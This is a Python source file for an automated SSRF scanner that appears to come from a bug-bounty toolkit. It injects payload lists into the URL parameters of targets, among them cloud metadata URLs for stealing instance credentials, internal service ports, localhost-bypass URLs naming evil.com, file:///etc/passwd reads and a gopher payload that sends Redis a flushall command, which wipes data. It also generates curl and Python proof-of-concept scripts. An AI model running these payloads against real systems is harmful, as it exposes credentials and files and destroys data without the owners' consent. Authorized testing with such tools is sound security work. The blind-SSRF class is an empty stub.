"""
Specialized SSRF Hunter
Advanced SSRF detection: basic, blind, cloud metadata, bypass techniques
"""

import asyncio
import re
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from urllib.parse import urlparse

from core.config_manager import get_config
from hunting.scanner_orchestrator import VulnerabilityFinding, ScanTarget, ScannerType


@dataclass
class SSRFContext:
    url: str
    parameter: str
    reflection_type: str  # direct, blind, error, oob
    payload: str
    response_indicator: str = ""


class SSRFHunter:
    """Specialized SSRF hunting module"""

    def __init__(self, config_manager):
        self.config = config_manager
        self.findings: List[VulnerabilityFinding] = []

        # SSRF payloads by category
        self.payloads = {
            "basic": [
                "http://localhost",
                "http://127.0.0.1",
                "http://[::1]",
                "http://0.0.0.0",
                "http://localhost:80",
                "http://127.0.0.1:80",
                "http://127.0.0.1:8080",
                "http://localhost:8080",
                "http://127.0.0.1:3000",
                "http://localhost:3000",
            ],
            "cloud_metadata": [
                "http://169.254.169.254/latest/meta-data/",  # AWS
                "http://169.254.169.254/latest/user-data",   # AWS
                "http://169.254.169.254/latest/dynamic/instance-identity/document",  # AWS
                "http://metadata.google.internal/computeMetadata/v1/",  # GCP
                "http://metadata.google.internal/computeMetadata/v1/instance/",  # GCP
                "http://169.254.169.254/metadata/v1/",  # DigitalOcean
                "http://169.254.169.254/metadata/v1.json",  # DigitalOcean
                "http://169.254.169.254",  # Generic
                "http://[fd00::169.254.169.254]",  # IPv6
            ],
            "internal_services": [
                "http://localhost:22",      # SSH
                "http://localhost:3306",    # MySQL
                "http://localhost:5432",    # PostgreSQL
                "http://localhost:6379",    # Redis
                "http://localhost:27017",   # MongoDB
                "http://localhost:9200",    # Elasticsearch
                "http://localhost:11211",   # Memcached
                "http://localhost:8086",    # InfluxDB
                "http://localhost:9090",    # Prometheus
                "http://localhost:3000",    # Grafana/Node
                "http://localhost:8080",    # Jenkins/Tomcat
                "http://localhost:8443",    # HTTPS alt
                "http://localhost:9000",    # Portainer/SonarQube
            ],
            "bypass": [
                "http://127.0.0.1.xip.io",
                "http://localtest.me",
                "http://lvh.me",
                "http://vcap.me",
                "http://127.0.0.1.nip.io",
                "http://127.0.0.1.sslip.io",
                "http://[::1]",
                "http://0.0.0.0",
                "http://2130706433",  # 127.0.0.1 as decimal
                "http://0x7f000001",  # 127.0.0.1 as hex
                "http://127.1",
                "http://127.0.0.1:80@evil.com",
                "http://evil.com@127.0.0.1",
                "http://127.0.0.1:80#.evil.com",
                "http://127.0.0.1/?@evil.com",
                "http://127.0.0.1:80\\@evil.com",
            ],
            "protocols": [
                "file:///etc/passwd",
                "file:///c:/windows/win.ini",
                "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*0%0d%0a",  # Redis flush
                "dict://127.0.0.1:11211/stat",  # Memcached
                "ldap://127.0.0.1:389/",
                "tftp://127.0.0.1/",
            ],
            "dns_oob": [  # Requires interactsh/OOB server
                "http://{{interactsh-url}}",
                "http://{{interactsh-url}}/{{rand}}",
            ],
        }

    async def hunt(self, targets: List[ScanTarget]) -> List[VulnerabilityFinding]:
        """Hunt for SSRF vulnerabilities"""
        param_targets = [t for t in targets if t.parameters]

        for target in param_targets[:50]:
            for param_name, param_value in target.parameters.items():
                await self._test_parameter(target, param_name)

        return self.findings

    async def _test_parameter(self, target: ScanTarget, param_name: str):
        """Test a parameter for SSRF"""
        # Test basic SSRF
        await self._test_basic_ssrf(target, param_name)

        # Test cloud metadata
        await self._test_cloud_metadata(target, param_name)

        # Test internal services
        await self._test_internal_services(target, param_name)

        # Test bypasses
        await self._test_bypasses(target, param_name)

        # Test protocol handlers
        await self._test_protocols(target, param_name)

    async def _test_basic_ssrf(self, target: ScanTarget, param_name: str):
        """Test basic SSRF with localhost payloads"""
        for payload in self.payloads["basic"]:
            result = await self._send_and_analyze(target, param_name, payload, "basic")
            if result:
                result.scanner = ScannerType.CUSTOM
                result.vuln_type = "ssrf"
                result.severity = "P2"
                result.title = f"SSRF in {param_name} parameter (localhost access)"
                result.description = f"Server-side request forgery in {param_name} parameter. Allows access to localhost/internal services. Payload: {payload}"
                result.tags = ["ssrf", "localhost", "internal-access"]
                self.findings.append(result)
                break  # One is enough for basic

    async def _test_cloud_metadata(self, target: ScanTarget, param_name: str):
        """Test cloud metadata endpoint access"""
        for payload in self.payloads["cloud_metadata"]:
            result = await self._send_and_analyze(target, param_name, payload, "cloud_metadata")
            if result:
                result.scanner = ScannerType.CUSTOM
                result.vuln_type = "ssrf"
                result.severity = "P1"  # Cloud metadata is critical
                result.title = f"SSRF in {param_name} parameter (Cloud Metadata Access)"
                result.description = f"Server-side request forgery in {param_name} parameter allows access to cloud metadata endpoints. This can expose instance credentials, IAM roles, and sensitive configuration. Payload: {payload}"
                result.tags = ["ssrf", "cloud-metadata", "critical"]
                self.findings.append(result)
                break

    async def _test_internal_services(self, target: ScanTarget, param_name: str):
        """Test access to internal services"""
        for payload in self.payloads["internal_services"]:
            result = await self._send_and_analyze(target, param_name, payload, "internal_service")
            if result:
                result.scanner = ScannerType.CUSTOM
                result.vuln_type = "ssrf"
                result.severity = "P2"
                result.title = f"SSRF in {param_name} parameter (Internal Service Access)"
                result.description = f"Server-side request forgery in {param_name} parameter allows access to internal services. Payload: {payload}"
                result.tags = ["ssrf", "internal-service", "port-scanning"]
                self.findings.append(result)
                break

    async def _test_bypasses(self, target: ScanTarget, param_name: str):
        """Test SSRF bypass techniques"""
        # First check if basic payloads are blocked
        baseline = await self._send_and_analyze(target, param_name, "http://example.com", "baseline")
        if not baseline:
            return  # Parameter might not be vulnerable

        for payload in self.payloads["bypass"]:
            result = await self._send_and_analyze(target, param_name, payload, "bypass")
            if result:
                result.scanner = ScannerType.CUSTOM
                result.vuln_type = "ssrf"
                result.severity = "P2"
                result.title = f"SSRF in {param_name} parameter (Bypass)"
                result.description = f"SSRF bypass in {param_name} parameter using alternative localhost representation. Payload: {payload}"
                result.tags = ["ssrf", "bypass", "filter-bypass"]
                self.findings.append(result)
                break

    async def _test_protocols(self, target: ScanTarget, param_name: str):
        """Test alternative protocol handlers"""
        for payload in self.payloads["protocols"]:
            result = await self._send_and_analyze(target, param_name, payload, "protocol")
            if result:
                result.scanner = ScannerType.CUSTOM
                result.vuln_type = "ssrf"
                result.severity = "P1"  # File protocol can lead to RCE
                result.title = f"SSRF in {param_name} parameter (Protocol Handler: {payload.split(':')[0]})"
                result.description = f"Server-side request forgery with {payload.split(':')[0]} protocol in {param_name} parameter. Payload: {payload}"
                result.tags = ["ssrf", "protocol", payload.split(':')[0]]
                self.findings.append(result)
                break

    async def _send_and_analyze(self, target: ScanTarget, param_name: str,
                                 payload: str, test_type: str) -> Optional[VulnerabilityFinding]:
        """Send payload and analyze response for SSRF indicators"""
        import httpx

        if target.method == "GET":
            url = self._inject_parameter(target.url, param_name, payload)
            try:
                async with httpx.AsyncClient(timeout=15.0, follow_redirects=True) as client:
                    response = await client.get(url)
            except Exception:
                return None
        else:
            data = dict(target.parameters)
            data[param_name] = payload
            try:
                async with httpx.AsyncClient(timeout=15.0, follow_redirects=True) as client:
                    response = await client.post(target.url, data=data)
            except Exception:
                return None

        # Analyze response for SSRF indicators
        indicator = self._analyze_ssrf_response(response, payload, test_type)
        if indicator:
            return VulnerabilityFinding(
                scanner=ScannerType.CUSTOM,
                vuln_type="ssrf",
                severity="P2",
                title="",
                description="",
                target=target,
                evidence={
                    "technique": test_type,
                    "payload": payload,
                    "indicator": indicator,
                    "status_code": response.status_code,
                    "response_snippet": response.text[:500],
                    "response_headers": dict(response.headers),
                },
                poc=self._generate_ssrf_poc(target.url, param_name, payload, test_type),
                confidence=0.8,
                tags=["ssrf", test_type],
            )
        return None

    def _analyze_ssrf_response(self, response, payload: str, test_type: str) -> Optional[str]:
        """Analyze response for SSRF success indicators"""
        # Check for cloud metadata responses
        if test_type == "cloud_metadata":
            indicators = [
                "ami-id", "instance-id", "iam", "security-groups",
                "project-id", "zone", "instance-name",
                "droplet-id", "vpc-id", "subnet-id",
            ]
            for ind in indicators:
                if ind in response.text.lower():
                    return f"cloud_metadata:{ind}"

        # Check for internal service responses
        if test_type == "internal_service":
            service_indicators = {
                "ssh": ["ssh-", "openssh"],
                "mysql": ["mysql_native_password", "mariadb", "sqlstate"],
                "postgresql": ["postgresql", "pg_hba"],
                "redis": ["redis_version", "redis_mode", "+PONG"],
                "mongodb": ["mongodb", "wire protocol"],
                "elasticsearch": ["cluster_name", "number_of_nodes"],
                "memcached": ["version", "libevent", "pointer_size"],
                "influxdb": ["influxdb", "version"],
                "prometheus": ["prometheus", "metrics"],
                "grafana": ["grafana", "csrf_token"],
                "jenkins": ["jenkins", "crumb"],
                "tomcat": ["apache tomcat", "catalina"],
            }

            for service, indicators in service_indicators.items():
                for ind in indicators:
                    if ind in response.text.lower():
                        return f"internal_service:{service}"

        # Check for file protocol
        if test_type == "protocol" and payload.startswith("file://"):
            if "root:" in response.text or "daemon:" in response.text or "[extensions]" in response.text:
                return "file_protocol:etc_passwd_or_win_ini"

        # Check for error messages indicating internal access
        error_indicators = [
            "connection refused",
            "connection timeout",
            "no route to host",
            "network unreachable",
            "connection reset",
            "econnrefused",
            "etimedout",
        ]

        response_lower = response.text.lower()
        for ind in error_indicators:
            if ind in response_lower:
                return f"error:{ind}"

        # Check for successful connection (different from baseline)
        if response.status_code in [200, 401, 403, 500, 502, 503]:
            # Could be successful - need more context
            pass

        return None

    def _inject_parameter(self, url: str, param_name: str, value: str) -> str:
        """Inject parameter into URL"""
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param_name] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _generate_ssrf_poc(self, url: str, param: str, payload: str, test_type: str) -> str:
        """Generate SSRF POC"""
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        base_url = urllib.parse.urlunparse(parsed._replace(query=''))

        poc = f"""# SSRF Proof of Concept
## Vulnerability Details
- **URL**: {url}
- **Parameter**: {param}
- **Test Type**: {test_type}
- **Payload**: {payload}

## Reproduction Steps
1. Navigate to: {base_url}?{param}={urllib.parse.quote(payload)}
2. Observe server-side request to internal resource

## cURL Command
```bash
curl -X GET "{base_url}?{param}={urllib.parse.quote(payload)}"
```

## Python Script
```python
import requests

url = "{base_url}"
params = {{"{param}": "{payload}"}}
response = requests.get(url, params=params, timeout=15)
print(f"Status: {{response.status_code}}")
print(f"Response: {{response.text[:500]}}")

# Check for indicators
if "ami-id" in response.text.lower():
    print("AWS Metadata accessible!")
elif "root:" in response.text:
    print("File protocol - /etc/passwd readable!")
```"""
        return poc


class BlindSSRFHunter:
    """Blind SSRF hunter using OOB (Out-of-Band) techniques"""

    def __init__(self, config_manager):
        self.config = config_manager
        self.interactsh_url = os.getenv("INTERACTSH_URL", "")

    async def hunt(self, targets: List[ScanTarget]) -> List[VulnerabilityFinding]:
        """Hunt for blind SSRF using OOB"""
        if not self.interactsh_url:
            return []

        findings = []

        payloads = [
            f"http://{self.interactsh_url}",
            f"http://{self.interactsh_url}/{{rand}}",
            f"http://{{rand}}.{self.interactsh_url}",
        ]

        for target in targets:
            for param_name in target.parameters.keys():
                for payload in payloads:
                    # Send payload and wait for OOB interaction
                    # This would need interactsh client integration
                    pass

        return findings


import os